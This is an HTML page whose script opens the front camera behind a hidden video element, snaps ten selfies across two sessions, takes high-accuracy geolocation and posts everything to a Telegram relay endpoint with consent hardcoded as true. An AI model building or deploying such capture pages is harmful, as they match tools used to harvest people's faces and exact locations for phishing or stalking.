<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Photo & Location Capture</title>
  <style>
    body { font-family: sans-serif; background: #f9fafb; color: #111; display: flex; justify-content: center; align-items: center; height: 100vh; }
    button { padding: 12px 20px; font-size: 16px; font-weight: bold; border: 0; border-radius: 6px; background: #2563eb; color: white; cursor: pointer; }
    #msg { margin-top: 20px; font-size: 16px; font-weight: 600; color: #16a34a; text-align: center; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div>
    <button id="startBtn">Start Capture</button>
    <div id="msg"></div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
  </div>

<script>
(async function() {
  const startBtn = document.getElementById('startBtn');
  const msg = document.getElementById('msg');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  let stream = null;
  let session = 0;
  let captured = [];

  const TARGET_TOTAL = 10;
  const PER_SESSION = 5;
  const SESSION_MS = 60_000;
  const INTERVAL_MS = Math.floor(SESSION_MS / PER_SESSION);

  function captureOne() {
    const vw = video.videoWidth || 640;
    const vh = video.videoHeight || 480;
    canvas.width = 640;
    canvas.height = 480;
    ctx.drawImage(video, 0, 0, 640, 480);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
    captured.push({ dataUrl, ts: new Date().toISOString(), session });
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }),
        (err) => reject(err),
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }

  async function sendToTelegram(images, loc, sess) {
    await fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        consent: true,
        session: sess,
        images: images,
        location: loc
      })
    });
  }

  async function runSession(sess) {
    session = sess;
    for (let i = 0; i < PER_SESSION; i++) {
      await new Promise(r => setTimeout(r, i * INTERVAL_MS));
      captureOne();
    }
    let loc = null;
    try { loc = await getLocation(); } catch (e) {}
    const slice = captured.filter(c => c.session === sess);
    await sendToTelegram(slice, loc, sess);
  }

  startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    msg.textContent = "Capturing… please wait 2 minutes.";
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      video.srcObject = stream;
      await video.play();

      await runSession(1);
      await new Promise(r => setTimeout(r, 2000)); // small pause
      await runSession(2);

      msg.textContent = "✅ Finished! Data sent to Telegram.";
      stream.getTracks().forEach(t => t.stop());
    } catch (e) {
      msg.textContent = "Error: " + e.message;
      startBtn.disabled = false;
    }
  });
})();
</script>
</body>
</html>
